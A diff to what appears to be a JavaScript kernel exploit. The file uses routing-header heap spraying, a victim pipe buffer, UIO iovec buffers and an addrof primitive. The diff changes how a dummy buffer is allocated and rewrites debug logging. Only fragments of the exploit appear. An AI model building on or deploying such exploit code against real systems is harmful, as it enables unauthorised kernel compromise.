@@ -199,9 +199,8 @@ let msg = new Buffer(MSG_HDR_SIZE);
 let sprayRthdrLen = 0;
 let msgIov = new Buffer(MSG_IOV_NUM * IOV_SIZE);
 
-const ptr = new Pointer(mem.alloc(0x1000));
-let dummyBuffer = new Buffer(ptr, 0x1000);
-//let dummyBuffer = new Buffer(0x1000);
+ 
+ let dummyBuffer = new Buffer(0x1000);
 let tmp = new Buffer(PAGE_SIZE);
 let victimPipebuf = new Buffer(PIPEBUF_SIZE);
 let uioIovRead = new Buffer(UIO_IOV_NUM * IOV_SIZE);
@@ -696,15 +695,13 @@ function performSetup() {
 
         log("Filling dummy buffer with 0x41");
 
-	   log("dummyBuffer object:", dummyBuffer);
-log("dummyBuffer.addr:", dummyBuffer.addr);
-log("mem.addrof(dummyBuffer):", mem.addrof(dummyBuffer));
-	   
-	   log("dummyBuffer addr =", hex(dummyBuffer.address()));
+  log("dummyBuffer.addr =", dummyBuffer.addr.toString());
+
+	
 
        dummyBuffer.fill(0x41);
         
-        log("dummy after fill",dummyBuffer.address());
+        log("dummy after fill",dummyBuffer.addr.toString());
         
         log("Setting up UIO IOV buffers");
         uioIovRead.putLong(0, dummyBuffer.address());
@@ -1448,6 +1445,7 @@ class WorkerState {
 }
 
 main();
+
 
 
 
